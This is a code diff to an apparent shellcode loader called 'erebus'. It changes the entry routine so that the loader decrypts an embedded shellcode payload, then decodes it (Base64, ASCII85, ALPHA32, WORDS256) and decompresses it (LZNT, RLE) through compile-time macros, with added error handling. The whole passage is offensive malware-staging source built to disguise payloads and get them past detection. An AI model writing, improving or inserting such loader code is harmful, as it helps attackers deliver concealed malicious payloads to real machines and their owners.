@@ -235,11 +235,25 @@ VOID entry(void)
 	erebus::DecryptShellcodeWithKeyAndIv(&shellcode_ptr, &shellcode_size, key_copy, sizeof(key_copy), iv, iv_len);
 	SecureZeroMemory(key_copy, sizeof(key_copy));
 
+#if CONFIG_ENCODING_TYPE == 1
+#define DecodeShellcode erebus::DecodeBase64
+#elif CONFIG_ENCODING_TYPE == 2
+#define DecodeShellcode erebus::DecodeASCII85
+#elif CONFIG_ENCODING_TYPE == 3
+#define DecodeShellcode erebus::DecodeALPHA32
+#elif CONFIG_ENCODING_TYPE == 4
+#define DecodeShellcode erebus::DecodeWORDS256
+#endif
+#if CONFIG_COMPRESSION_TYPE == 1
+#define DecompressShellcode erebus::DecompressionLZNT
+#elif CONFIG_COMPRESSION_TYPE == 2
+#define DecompressShellcode erebus::DecompressionRLE
+#endif
+
 	// Decode stage (Base64 / ASCII85 / ALPHA32 / WORDS256).
 	// shellcrypt pipeline: compress → encode → encrypt.
 	// Reverse:             decrypt  → decode  → decompress.
-	// DecodeShellcode is defined by config.hpp based on CONFIG_ENCODING_TYPE;
-	// when type == 0 the macro is undefined so this block compiles away.
+	// When CONFIG_ENCODING_TYPE == 0 the macro is undefined so this block compiles away.
 #ifdef DecodeShellcode
 	{
 		BYTE*  _dec_out = nullptr;
@@ -256,16 +270,18 @@ VOID entry(void)
 		{
 			LOG_ERROR("Shellcode decode step failed");
 			if (_dec_out) free(_dec_out);
+			shellcode_ptr  = nullptr;
+			shellcode_size = 0;
 		}
 	}
 #endif
 
-	// Decompress stage. DecompressShellcode is defined by config.hpp based on
-	// CONFIG_COMPRESSION_TYPE; when type == 0 the macro is undefined and this
-	// block compiles away - no auto-detection, no false positives.
+	// Decompress stage. When CONFIG_COMPRESSION_TYPE == 0 the macro is
+	// undefined and this block compiles away.
 #ifdef DecompressShellcode
 	DecompressShellcode(&shellcode_ptr, &shellcode_size);
-	LOG_SUCCESS("Decompressed shellcode: %zu bytes", shellcode_size);
+	if (shellcode_ptr && shellcode_size)
+		LOG_SUCCESS("Decompressed shellcode: %zu bytes", shellcode_size);
 #endif
 
 	if (shellcode_ptr == NULL || shellcode_size == 0)
